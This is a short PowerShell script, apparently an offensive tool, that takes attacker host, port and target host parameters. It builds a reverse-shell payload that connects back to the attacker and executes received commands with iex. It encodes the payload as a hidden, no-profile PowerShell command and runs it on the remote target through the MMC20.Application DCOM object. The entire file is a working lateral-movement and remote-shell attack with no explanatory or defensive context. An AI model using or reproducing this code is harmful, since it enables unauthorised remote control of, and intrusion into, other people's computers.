[CmdletBinding()]
param (
    [Parameter(Mandatory=$true, Position=0)]
    [string]$lhost,

    [Parameter(Mandatory=$true, Position=1)]
    [string]$lport,

    [Parameter(Mandatory=$true, Position=2)]
    [string]$rhost
)

$payload = '$client = New-Object System.Net.Sockets.TCPClient("lhost", lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,  0,  $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0,  $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close()'
$payload = $payload.Replace('lhost', $lhost).Replace('lport', $lport)

$cmd = "powershell -nop -w hidden -e " + [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))

$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "$rhost"))

$dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "$cmd", "7")
